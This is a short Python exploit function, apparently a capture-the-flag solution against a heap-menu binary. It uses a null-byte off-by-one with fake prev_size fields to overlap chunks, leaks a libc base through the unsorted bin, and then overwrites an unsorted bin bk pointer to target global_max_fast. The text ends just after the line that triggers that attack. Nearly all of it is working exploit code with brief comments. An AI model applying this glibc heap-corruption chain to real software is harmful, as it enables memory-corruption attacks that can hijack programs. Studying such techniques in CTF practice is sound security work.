
def exploit():

	#null off one leak libc
	# with unsorted bin only
	#where fastbin is banned
	add(0x18)
	add(0x508)
	add(0x18)
	edit(1, 'a'*0x4f0 + p64(0x500))			#fake pre_size
	add(0x18)
	add(0x508)
	add(0x18)
	edit(4, 'a'*0x4f0 + p64(0x500)) 		#fake pre_size
	add(0x18)     
	free(1)
	edit(0,'b'*0x18)						#fake unsorted bin's size to 0x500, which is same as fake pre_size
	add(0x18)     							
	add(0x4d8)   							#7 , within address with 1
	free(1)
	free(2)  
	add(0x18)

	show(7)
	leak = u64(p.recv(6).ljust(8, '\x00'))
	libc_base = leak  - 0x3c4b78
	print "libc_base ==> " , hex(libc_base)

	dbg()

	#fastbin restart by unsorted bin arttack
	max_fast = libc_base + 0x3c67f8

	free(1)
	add(0x38)
	edit(7,p64(0)*3+p64(0x4f1)+"aaaaaaaa"+p64(max_fast - 16))		#modify unsorted bin bk
	add(0x4e8)														#trigger attack